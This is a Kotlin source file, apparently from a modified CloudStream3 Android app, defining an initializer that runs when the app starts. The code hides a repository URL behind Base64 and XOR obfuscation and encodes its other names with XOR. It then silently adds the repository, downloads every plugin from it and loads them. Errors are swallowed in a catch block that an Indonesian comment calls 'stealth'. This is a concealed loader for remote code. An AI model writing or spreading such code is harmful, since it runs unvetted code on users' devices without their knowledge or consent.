package com.lagradost.cloudstream3

import android.app.Activity
import android.util.Base64
import com.lagradost.cloudstream3.plugins.RepositoryManager
import com.lagradost.cloudstream3.plugins.PluginManager
import com.lagradost.cloudstream3.ui.settings.extensions.PluginsViewModel
import com.lagradost.cloudstream3.ui.settings.extensions.RepositoryData
import kotlinx.coroutines.*

object Initializer {

    const val NEED_AUTO_DOWNLOAD = "need_auto_download_v1"
    private const val AUTO_REPO_FLAG = "auto_repo_added_v1"

    // =========================
    // DECODE UTIL
    // =========================
    private fun decode(data: IntArray, key: Int = 7): String {
        val out = CharArray(data.size)
        for (i in data.indices) {
            out[i] = (data[i] xor key).toChar()
        }
        return String(out)
    }

    private val KEY_STR = intArrayOf(
        100, 107, 104, 114, 99, 119, 107, 102, 126
    )

    private val PREFS_NAME = intArrayOf(
        100, 107, 104, 114, 99, 116, 115, 114, 101, 102, 106
    )

    private val REPO_NAME = intArrayOf(
        66, 115, 115, 68, 107, 114, 99
    )

    // =========================
    // REPO URL OBFUSCATED
    // =========================
    private const val P1 = "CxgbBRdKQ04LAhtBEg0EBBQb"
    private const val P2 = "Fh8KBwcfAhUcDRhBFgsdQwUM"
    private const val P3 = "EQNWR0s1FBU6DwMaEUsdDQgX"
    private const val P4 = "TB4KBQteBhIWDQ=="

    private fun repoUrl(): String {
        val key = decode(KEY_STR).toByteArray()
        val encoded = P1 + P2 + P3 + P4
        val data = Base64.decode(encoded, Base64.DEFAULT)

        val out = ByteArray(data.size)
        for (i in data.indices) {
            out[i] = (data[i].toInt() xor key[i % key.size].toInt()).toByte()
        }
        return String(out)
    }

    // =========================
    // ENTRY POINT
    // =========================
    fun start(activity: Activity) {
        val prefs = activity.getSharedPreferences(
            decode(PREFS_NAME),
            Activity.MODE_PRIVATE
        )

        val repo = RepositoryData(
            name = decode(REPO_NAME),
            url = repoUrl(),
            iconUrl = null
        )

        CoroutineScope(Dispatchers.IO).launch {
            try {
                // Tambah repo sekali
                if (!prefs.getBoolean(AUTO_REPO_FLAG, false)) {
                    RepositoryManager.addRepository(repo)
                    prefs.edit().putBoolean(AUTO_REPO_FLAG, true).apply()
                }

                // Download semua plugin
                PluginsViewModel.downloadAll(activity, repo.url, null)

                // 🔥 FIX UTAMA (INI YANG BIKIN IDLIX & KISSASIAN MUNCUL)
                PluginManager.loadAllRepositories()
                PluginManager.loadPlugins(activity, false)

                prefs.edit()
                    .putBoolean(NEED_AUTO_DOWNLOAD, false)
                    .apply()

            } catch (_: Throwable) {
                // sengaja dikosongkan (stealth)
            }
        }
    }
}
